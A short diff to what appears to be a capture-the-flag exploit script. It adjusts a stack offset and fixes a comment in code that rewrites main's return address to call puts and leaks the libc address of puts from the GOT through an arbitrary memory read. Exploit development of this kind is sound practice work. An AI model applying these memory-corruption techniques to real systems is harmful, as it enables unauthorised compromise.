@@ -61,6 +61,10 @@ print("puts GOT: %s" % hex(puts_got))
 # Cannot use puts PLT to leak puts GOT there at return of main
 # because PIE mode PLT use EBX to store offset but when returning EBX is null
 
+# A unified shift was applied to original shift to use in main's stack frame
+# Because of the compiler's alignment
+unified_shift = 4
+
 # Write main retaddr at shift 89 to call puts
 write_stack(p, 89 + unified_shift, puts_got)
 # Write retaddr of puts at shift 90 back to main
@@ -71,7 +75,7 @@ execute(p)
 puts_libc = u32(p.recv(4))
 """
 
-# Leask puts_got by using a 
+# Leak puts_got by using a arbitary memory read
 puts_libc = read_stack(p, (puts_got - user_stack_base) / 4)
 print("puts libc: %s" % hex(puts_libc))
 
